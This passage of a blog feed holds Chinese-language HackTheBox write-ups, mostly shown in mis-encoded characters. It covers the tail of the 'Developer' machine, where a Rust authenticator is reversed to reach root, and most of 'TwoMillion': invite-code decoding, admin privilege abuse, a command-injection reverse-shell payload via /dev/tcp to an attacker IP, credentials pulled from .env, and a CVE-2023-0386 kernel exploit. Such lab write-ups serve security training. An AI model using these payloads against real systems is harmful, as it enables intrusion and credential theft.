ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯`key`å’Œ`VI`\n\næˆ‘ä»¬ä»`v36` å’Œ `v37`ä¸­å°†å€¼å¤åˆ¶å‡ºæ¥\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image31.png)\n\nè¿˜å› ä¸ºæ˜¯å°ç«¯æ˜¾ç¤ºçš„é—®é¢˜ï¼Œæˆ‘ä»¬è¿˜è¦å¯¹å…¶è½¬æ¢ä¸€ä¸‹\n\n```bash\nD5F5F4BE3DD4209E6191795C3432E8A3\n6A812006DC5598A79A95D2D9E3591F76\n//\nA3E832345C7991619E20D43DBEF4F5D5\n761F59E3D9D2959AA79855DC0620816A\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image32.png)\n\næˆ‘ä»¬å°†åŠ å¯†å’Œè§£å¯†å‡½æ•°å‡†å¤‡å¥½\n\nå†åˆ°ä¸‹è¾¹ï¼ˆä»£ç å–‚ç»™`AI`ï¼‰ï¼Œé¦–å…ˆä¼šåˆ¤æ–­æ˜æ–‡é•¿åº¦æ˜¯å¦ç­‰äº`32`\n\n```bash\nif ( size[1] == 32\n    && (ptr == (u8 *)v5\n     || _mm_movemask_epi8(\n          _mm_and_si128(\n            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr + 1), _mm_loadu_si128(v5 + 1)),\n            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr), _mm_loadu_si128(v5)))) == 0xFFFF) )\n  {\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image33.png)\n\n`ptr`Â (æˆ‘ä»¬çš„è§£å¯†ç»“æœ) çš„åœ°å€è¢«åŠ è½½åˆ°äº†Â `RAX`Â å¯„å­˜å™¨ã€‚`v5`Â (ç¨‹åºå†…ç½®çš„ç›®æ ‡æ˜æ–‡) çš„åœ°å€è¢«åŠ è½½åˆ°äº†Â `R15`Â å¯„å­˜å™¨ã€‚\n\né€šè¿‡è°ƒè¯•ç¡®è®¤ä¸€ä¸‹\n\n```bash\npwndbg> b main\npwndbg> r\npwndbg> b *0x55555555b9b9\nBreakpoint 2 at 0x55555555b9b9\npwndbg> c\nContinuing.\nWelcome to TheCyberGeek's super secure login portal!\nEnter your password to access the super user:\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA //å› ä¸ºæœŸå¾…è§£å¯†åæ˜æ–‡é•¿åº¦æ˜¯32å› æ­¤è¾“å…¥32ä¸ªA\npwndbg> hexdump $rax 32 //è·å–RAXçš„å€¼\n+0000 0x5555555b7dd0  ed 2f 17 c5 87 44 a4 d8  5c a2 c9 6b d4 69 18 22  â”‚./...D..â”‚\\..k.i.\"â”‚\n+0010 0x5555555b7de0  69 86 ec f4 c8 2c 84 de  d8 c1 dc 4b ec 57 6e 44  â”‚i....,..â”‚...K.WnDâ”‚\n```\n\n```bash\nâœ  Developer awk '{for(i=3;i<=18;i++) printf $i}' rax\ned2f17c58744a4d85ca2c96bd46918226986ecf4c82c84ded8c1dc4bec576e44#    \n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image34.png)\n\nè§£å¯†æˆåŠŸï¼Œé‚£ä¹ˆ`R15`çš„å€¼åº”è¯¥å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„\n\n```bash\npwndbg> hexdump $r15 32\n+0000 0x5555555b7c20  fe 1b 25 f0 80 6a 97 ca  78 80 fd 58 fc 5c 20 23  â”‚..%..j..â”‚x..X.\\.#â”‚\n+0010 0x5555555b7c30  6c a2 db d0 e5 02 b5 fa  eb c0 af 3a 9f 27 15 2c  â”‚l.......â”‚...:.'.,â”‚\n```\n\n```bash\nâœ  Developer awk '{for(i=3;i<=18;i++) printf $i}' r15\nfe1b25f0806a97ca7880fd58fc5c20236ca2dbd0e502b5faebc0af3a9f27152c#   \n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image35.png)\n\nå¾—åˆ°é‡ç‚¹`RustForSecurity@Developer@2021:)`\n\næˆ‘ä»¬åˆ°`karl`çš„`shell`ä¸­è¿è¡Œç¨‹åºï¼Œä¼šè®©æˆ‘ä»¬è¾“å…¥æˆ‘ä»¬çš„å…¬é’¥\n\n```bash\nkarl@developer:~$ sudo /root/.auth/authenticator \n[sudo] password for karl: \nWelcome to TheCyberGeek's super secure login portal!\nEnter your password to access the super user: \nRustForSecurity@Developer@2021:)\nYou have successfully authenticated\nEnter your SSH public key in now:\nssh-xxxxx AAAAC3NzxxxxxxxJqSEDwP6SCfe root@kali\nYou may now authenticate as root!\n```\n\nç„¶åé€šè¿‡æˆ‘ä»¬çš„ç§é’¥å°±å¯ä»¥ç™»å½•åˆ°`root`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image36.png)\n\nè¯»å– `root.txt`\n\n```bash\nroot@developer:~# cat root.txt \n720b2e4080688fxxxxx\n```\n\n## æ€»ç»“\n\nå¾ˆå¤šçš„çŸ¥è¯†ç›²åŒºï¼Œæˆ–è€…è¯´æ˜¯æˆ‘æ²¡è€å¿ƒï¼Œå¾ˆå¤šåœ°æ–¹éƒ½è¦çœ‹ä¸€ä¸‹WPæ‰èƒ½çŸ¥é“å¦‚ä½•èµ°ä¸‹å»\n\næ€»çš„æ¥è¯´éš¾åº¦ä¸ªäººè€Œè¨€ `8/10` ï¼Œæ³ª",
            "url": "https://www.sunsetaction.top/2025/06/22/HackTheBoxMachine - Developer",
            "title": "HackTheBox - Machine - Developer",
            "summary": "Machine Developer https://app.hackthebox.com/machines/Developer | Linux | Hard Recon è®¿é—® HTTP å¯ä»¥åˆ›å»ºè´¦æˆ·ï¼Œæ³¨å†Œä¸€ä¸ªç”¨æˆ· sunset ï¼Œåˆ›å»ºå®Œæ¯•åä¼šç›´æ¥è¿›å…¥åå° é‡Œé¢ä¼šæœ‰ä¸€äº›CTFé¢˜ï¼Ÿè®©ä½ åšï¼Ÿ CTF PE...",
            "date_modified": "2025-06-22T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Linux",
                "CTF",
                "Rrverse",
                "Rust",
                "Django",
                "Tabanbbing",
                "Crack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/21/HackTheBoxMachine - TwoMillion",
            "content_html": "\n# Machine - TwoMillion\n\n> https://app.hackthebox.com/machines/TwoMillion | `Linux`Â |Â `Eas`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image.png)\n\n## Recon\n\n```bash\nâœ  TwoMillion nmap -sT -min-rate 5000 10.10.11.221  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:22 CST\nNmap scan report for 10.10.11.221\nHost is up (0.072s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.94 seconds\n```\n\n```bash\nâœ  TwoMillion nmap -sT -A -p 22,80 10.10.11.221   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:23 CST\nNmap scan report for 10.10.11.221\nHost is up (0.085s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx\n|_http-title: Did not follow redirect to http://2million.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   117.43 ms 10.10.16.1\n2   71.72 ms  10.10.11.221\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.44 seconds\nâœ  TwoMillion ls                                  \n```\n\nè®¿é—® `HTTP` æœåŠ¡ï¼Œé‡‡é›†æŒ‡çº¹ï¼Œæ˜¯ä»‹ç» `HackTheBox` ç½‘ç«™\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image1.png)\n\næœ‰ä¸€ä¸ªç™»å½•é¡µ\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image2.png)\n\næ³¨å†Œéœ€è¦æ‹¿åˆ°é‚€è¯·ç \n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image3.png)\n\né€šè¿‡ç›®å½•æ‰«æèƒ½æ‰«æåˆ°å¦å¤–ä¸€ä¸ªæ³¨å†Œé¡µé¢ï¼Œä¾æ—§æ˜¯éœ€è¦`Invite Code`\n\n```bash\nâœ  TwoMillion dirsearch -u http://2million.htb -e txt,zip -x 403,404,503 \n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 9979\n\nOutput File: /root/Desktop/HackTheBox/TwoMillion/reports/http_2million.htb/_25-06-20_20-53-44.txt\n\nTarget: http://2million.htb/\n\n[20:53:44] Starting: \n[20:53:53] 200 -    2KB - /404\n[20:54:04] 401 -    0B  - /api\n[20:54:04] 401 -    0B  - /api/v1\n[20:54:05] 301 -  162B  - /assets  ->  http://2million.htb/assets/\n[20:54:12] 301 -  162B  - /css  ->  http://2million.htb/css/\n[20:54:18] 301 -  162B  - /fonts  ->  http://2million.htb/fonts/\n[20:54:20] 302 -    0B  - /home  ->  /\n[20:54:21] 301 -  162B  - /images  ->  http://2million.htb/images/\n[20:54:23] 301 -  162B  - /js  ->  http://2million.htb/js/\n[20:54:25] 200 -    4KB - /login\n[20:54:26] 302 -    0B  - /logout  ->  /\n[20:54:38] 200 -    4KB - /register\n[20:54:52] 301 -  162B  - /views  ->  http://2million.htb/views/\n\nTask Completed\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image4.png)\n\n## GetInviteCode\n\næˆ‘ä»¬ä»”ç»†è§‚å¯Ÿ`invite`é¡µé¢ï¼Œä¼šåŠ è½½ä¸€ä¸ªJSæ–‡ä»¶`inviteapi.min.js` ï¼Œæ˜¯ä¸€ä¸ª`Packer`ä¸€ç§`JavaScript`ä»£ç æ··æ·†å™¨\n\n```bash\neval(\n  (function (p, a, c, k, e, d) {\n    e = function (c) {\n      return c.toString(36);\n    };\n    if (!''.replace(/^/, String)) {\n      while (c--) {\n        d[c.toString(a)] = k[c] || c.toString(a);\n      }\n      k = [\n        function (e) {\n          return d[e];\n        },\n      ];\n      e = function () {\n        return '\\\\w+';\n      };\n      c = 1;\n    }\n    while (c--) {\n      if (k[c]) {\n        p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]);\n      }\n    }\n    return p;\n  })(\n    '1 i(4){h 8={\"4\":4};$.9({a:\"7\",5:\"6\",g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\"7\",5:\"6\",b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',\n    24,\n    24,\n    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split(\n      '|',\n    ),\n    0,\n    {},\n  ),\n);\n\n```\n\næˆ‘ä»¬ä½¿ç”¨`AI`å°†å…¶è¿˜åŸå¾—åˆ°\n\n```bash\nfunction verifyInviteCode(code) {\n  var formData = { \"code\": code };\n  $.ajax({\n    type: \"POST\",\n    dataType: \"json\",\n    data: formData,\n    url: '/api/v1/invite/verify',\n    success: function(response) {\n      console.log(response);\n    },\n    error: function(response) {\n      console.log(response);\n    }\n  });\n}\n\nfunction makeInviteCode() {\n  $.ajax({\n    type: \"POST\",\n    dataType: \"json\",\n    url: '/api/v1/invite/how/to/generate',\n    success: function(response) {\n      console.log(response);\n    },\n    error: function(response) {\n      console.log(response);\n    }\n  });\n}\n```\n\nå…¶ä¸­çš„`/api/v1/invite/how/to/generate`å¾ˆä»¤äººæ„Ÿå…´è¶£\n\n```bash\nâœ  TwoMillion curl http://2million.htb/api/v1/invite/how/to/generate -X POST\n{\"0\":200,\"success\":1,\"data\":{\"data\":\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\",\"enctype\":\"ROT13\"},\"hint\":\"Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\"}#\n```\n\n> Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\n> \n\nä»`dada`èƒ½çœ‹åˆ°ï¼ŒåŠ å¯†ç±»å‹æ˜¯`ROT13`\n\n```bash\n\"data\":{\n\t\"data\":\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr\",\n\t\"enctype\":\"ROT13\"\n}\n```\n\né€šè¿‡`CyberChef`å³å¯è§£å¯†\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image5.png)\n\n```bash\nIn order to generate the invite code, make a POST request to \\/api\\/v1\\/invite\\/generate\n```\n\nè®©æˆ‘ä»¬å‘`/api/v1/invite/generate` å‘èµ·`POST`è¯·æ±‚\n\n```bash\nâœ  TwoMillion curl http://2million.htb/api/v1/invite/generate  -X POST     \n{\"0\":200,\"success\":1,\"data\":{\"code\":\"NjlKS04tMkVHSTQtM1NIN0YtUjNLRFk=\",\"format\":\"encoded\"}}#  \n```\n\nå¯ä»¥çœ‹åˆ°è¿˜æ˜¯åŠ å¯†çš„ï¼Œä½†æ˜¯è¿™æ¬¡çš„åŠ å¯†å°±æ˜¯ç®€å•çš„`base64`ç¼–ç \n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image6.png)\n\nå¾—åˆ°é‚€è¯·ç  `69JKN-2EGI4-3SH7F-R3KDY`\n\næˆ‘ä»¬é€šè¿‡é‚€è¯·ç æ³¨å†Œç”¨æˆ· `sunset`\n\n## åå°åˆ©ç”¨\n\næˆ‘ä»¬ä»`Rules`ä¸­èƒ½çŸ¥é“æ˜¯å¯ä»¥æ”»å‡»å…¶ä»–æˆå‘˜çš„\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image7.png)\n\nå¹¶ä¸”åœ¨ `http://2million.htb/home/access#` ä¸­èƒ½ç”Ÿæˆ`opvn`æ–‡ä»¶ï¼ˆç»è¿‡å®éªŒæ˜¯æ— æ³•è¿›è¡Œè¿æ¥çš„ï¼‰ï¼Œç«¯ç‚¹æ˜¯**`/**api/v1/user/vpn/generate`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image8.png)\n\næˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ç«¯ç‚¹æ˜¯**`/**api/v1/user` é‚£ä¹ˆå¯èƒ½ä¼šæœ‰**`/**api/v1/admin`\n\nè¿™é‡Œæˆ‘ä½¿ç”¨`feroxbuster` æµ‹è¯•äº†å¾ˆä¹…ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰`fuzz`å‡ºæ¥\n\nä½†æ˜¯è¿™é‡Œå…¶å®åªéœ€è¦è®¿é—® `/api/v1`å°±å¯ä»¥å¾—åˆ°æ¥å£è·¯å¾„ä¿¡æ¯â€¦\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image9.png)\n\n```bash\n{\n  \"v1\": {\n    \"user\": {\n      \"GET\": {\n        \"/api/v1\": \"Route List\",\n        \"/api/v1/invite/how/to/generate\": \"Instructions on invite code generation\",\n        \"/api/v1/invite/generate\": \"Generate invite code\",\n        \"/api/v1/invite/verify\": \"Verify invite code\",\n        \"/api/v1/user/auth\": \"Check if user is authenticated\",\n        \"/api/v1/user/vpn/generate\": \"Generate a new VPN configuration\",\n        \"/api/v1/user/vpn/regenerate\": \"Regenerate VPN configuration\",\n        \"/api/v1/user/vpn/download\": \"Download OVPN file\"\n      },\n      \"POST\": {\n        \"/api/v1/user/register\": \"Register a new user\",\n        \"/api/v1/user/login\": \"Login with existing user\"\n      }\n    },\n    \"admin\": {\n      \"GET\": {\n        \"/api/v1/admin/auth\": \"Check if user is admin\"\n      },\n      \"POST\": {\n        \"/api/v1/admin/vpn/generate\": \"Generate VPN for specific user\"\n      },\n      \"PUT\": {\n        \"/api/v1/admin/settings/update\": \"Update user settings\"\n      }\n    }\n  }\n}\n```\n\n### æ¥å£æµ‹è¯•\n\nä¸‰ä¸ªç®¡ç†å‘˜æ¥å£ä¸­ï¼Œæˆ‘ä»¬å¯¹`/api/v1/admin/settings/update` æœ€æ„Ÿå…´è¶£\n\n```bash\n\"admin\": {\n      \"GET\": {\n        \"/api/v1/admin/auth\": \"Check if user is admin\"\n      },\n      \"POST\": {\n        \"/api/v1/admin/vpn/generate\": \"Generate VPN for specific user\"\n      },\n      \"PUT\": {\n        \"/api/v1/admin/settings/update\": \"Update user settings\"\n      }\n    }\n```\n\nå› ä¸ºå®ƒå¯èƒ½å¯ä»¥å°†æ™®é€šç”¨æˆ·æ›´æ”¹ä¸ºé«˜æƒé™ç”¨æˆ·\n\nè°ƒè¯•æ¥å£ï¼Œæˆ‘ä»¬ä¿®æ”¹ `Content-Type: application/json` æ—¶æç¤ºç¼ºå°‘å‚æ•° `email`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image10.png)\n\næ·»åŠ  `email` åç¼ºå°‘ `is_admin` ï¼Œç»§ç»­è·Ÿç€è¡¥å…¨å‚æ•°\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image11.png)\n\nè®¾ç½® `is_admin` ä¸º `1`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image12.png)\n\næµ‹è¯•æ˜¯å¦ä¿®æ”¹æˆåŠŸï¼Œæˆ‘ä»¬å›åˆ°ç®¡ç†å‘˜æ¥å£ä¸­çš„`/api/v1/admin/auth` ï¼Œå›æ˜¾`True`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image13.png)\n\nå†è·å–ç®¡ç†å‘˜è´¦æˆ·çš„`VPN`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image14.png)\n\né€šè¿‡å‘½ä»¤ä¹Ÿå¯ä»¥æ‹¿åˆ°\n\n```bash\nâœ  TwoMillion curl http://2million.htb/api/v1/admin/vpn/generate -X POST -H 'Cookie: PHPSESSID=ldkjilnio1ali642q30g4cs1p4' -H 'Content-Type: application/json' -d '{\"username\":\"admin\"}' -o admin.opvn\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 10844    0 10824  100    20  19492     36 --:--:-- --:--:-- --:--:-- 19538\n```\n\nä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œç®¡ç†å‘˜çš„`opvn`æ–‡ä»¶ä¹Ÿæ˜¯æ— æ³•ä½¿ç”¨çš„\n\næµ‹è¯•åå‘ç°å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image15.png)\n\næˆ‘ä»¬é€šè¿‡æ¥åå¼¹`shell`\n\n```bash\nPOST /api/v1/admin/vpn/generate HTTP/1.1\nHost: 2million.htb\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0\nCookie: PHPSESSID=ldkjilnio1ali642q30g4cs1p4\nUpgrade-Insecure-Requests: 1\nSec-GPC: 1\nPriority: u=0, i\nDNT: 1\nReferer: http://2million.htb/home/access\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\n\n{\n    \"username\":\"$(whoami;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.58/1234 0>&1')\"\n}\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image16.png)\n\n## æƒé™æå‡\n\n### Recon In www-data\n\næ’ä»¶ç›‘å¬ç«¯å£ï¼Œåœ¨å†…ç½‘ä¸­å‘å¸ƒäº†`mysql`å’Œ`Memcached`\n\n```bash\nwww-data@2million:~/html$ ss -tulpn\nNetid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process\nudp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*\nudp     UNCONN   0        0                0.0.0.0:68             0.0.0.0:*\ntcp     LISTEN   0        80             127.0.0.1:3306           0.0.0.0:*\ntcp     LISTEN   0        1024           127.0.0.1:11211          0.0.0.0:*\ntcp     LISTEN   0        511              0.0.0.0:80             0.0.0.0:*      users:((\"nginx\",pid=1198,fd=6))\ntcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*\ntcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*\ntcp     LISTEN   0        511                 [::]:80                [::]:*      users:((\"nginx\",pid=1198,fd=7))\ntcp     LISTEN   0        128                 [::]:22                [::]:*\n```\n\nè·å– `Memcached` ä¸­çš„æ•°æ®ï¼Œå‘½ä»¤ç½‘ä¸ŠæŸ¥å³å¯\n\n```bash\nstats items               \nSTAT items:1:number 1   \nSTAT items:1:number_hot 0       \n....\nSTAT items:4:evicted_unfetched 0\nSTAT items:4:evicted_active 0\n```\n\n```bash\nstats cachedump 1 100\nITEM foo [3 b; 0 s]\nEND\nstats cachedump 4 100\nITEM memc.sess.key.ldkjilnio1ali642q30g4cs1p4 [56 b; 1750433152 s]\nEND\n```\n\n```bash\nget foo\nVALUE foo 0 3\nbar\nEND\n\nget memc.sess.key.ldkjilnio1ali642q30g4cs1p4\nVALUE memc.sess.key.ldkjilnio1ali642q30g4cs1p4 0 56\nloggedin|b:1;id|i:13;username|s:6:\"sunset\";is_admin|i:1;\nEND\n```\n\nä½†æ˜¯å¾—åˆ°ä¿¡æ¯è²Œä¼¼å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨\n\nåœ¨å½“å‰ç›®å½•ä¸‹çš„`.env` ä¸­èƒ½æ‰¾åˆ° `admin` ç”¨æˆ·çš„å‡­æ®\n\n```bash\nwww-data@2million:~/html$ cat .env \nDB_HOST=127.0.0.1\nDB_DATABASE=htb_prod\nDB_USERNAME=admin\nDB_PASSWORD=SuperDuperPass123\n```\n\næˆåŠŸç™»å½•è¿›å»\n\n```bash\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nYou have mail.\nLast login: Tue Jun  6 12:43:11 2023 from 10.10.14.6\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nadmin@2million:~$ \n```\n\nè¯»å– `user.txt`\n\n```bash\nadmin@2million:~$ cat user.txt \ne3c66af3c3a55bxxxxxxx\n```\n\n### Recon In admin\n\næˆ‘ä»¬ä»`banner`ä¿¡æ¯ä¸­èƒ½çœ‹åˆ°`admin`ç”¨æˆ·æœ‰ä¸€å°é‚®ä»¶\n\n```bash\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n***You have mail.***\nLast login: Tue Jun  6 12:43:11 2023 from 10.10.14.6\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nadmin@2million:~$ \n```\n\n```bash\nadmin@2million:/var/mail$ cat admin \nFrom: ch4p <ch4p@2million.htb>\nTo: admin <admin@2million.htb>\nCc: g0blin <g0blin@2million.htb>\nSubject: Urgent: Patch System OS\nDate: Tue, 1 June 2023 10:45:22 -0700\nMessage-ID: <9876543210@2million.htb>\nX-Mailer: ThunderMail Pro 5.2\n\nHey admin,\n\nI'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.\n\nHTB Godfather\n```\n\n> å—¨ï¼Œç®¡ç†å‘˜ï¼Œ\næˆ‘çŸ¥é“ä½ æ­£åœ¨å°½å¿«å®Œæˆæ•°æ®åº“è¿ç§»ã€‚è¶ç€æˆ‘ä»¬éƒ¨åˆ†æœåŠ¡å™¨å®•æœºï¼Œèƒ½ä¸èƒ½ä¹Ÿå‡çº§ä¸€ä¸‹æˆ‘ä»¬è™šæ‹Ÿä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Ÿä»Šå¹´å·²ç»å‡ºç°äº†å‡ ä¸ªä¸¥é‡çš„ Linux å†…æ ¸ CVE æ¼æ´ã€‚OverlayFS/FUSE çš„é‚£ä¸ªæ¼æ´çœ‹èµ·æ¥å¾ˆç³Ÿç³•ã€‚æˆ‘ä»¬ä¸èƒ½è¢«å®ƒç»™å‘äº†ã€‚\n> \n\n### **CVE-2023-0386**\n\nç›´æ¥æ˜ç‰Œäº†\n\nåˆ©ç”¨é“¾æ¥ï¼šhttps://github.com/xkaneiki/CVE-2023-0386\n\nè·Ÿç€`Readme`æ•²å°±è¡Œ\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image17.png)\n\nè¯»å– `root.txt`\n\n```bash\nroot@2million:/root# cat root.txt \nc7bea054524b8584598731e5cb0441bb\n```\n\n## æ€»ç»“ & å°å½©è›‹\n\nä¸éš¾ï¼Œä½†æ˜¯æ­¥éª¤å¤šï¼Œåœ¨å‰æœŸéœ€è¦è¿›è¡Œå¾ˆå¤šæšä¸¾\n\n`root`ç›®å½•ä¸‹`thank_you.json` æ˜¯ä¸€ä¸²åŠ å¯†åçš„æ•°æ®\n\n```bash\nroot@2million:/root# cat thank_you.json \n{\"encoding\": \"url\", \"data\": \"%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D\"}\n```\n\nå¯ä»¥é€šè¿‡è¿™ä¸ªæ­¥éª¤æ¥æ­ç§˜\n\n![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image18.png)\n\n```bash\nDear HackTheBox Community,\n\nWe are 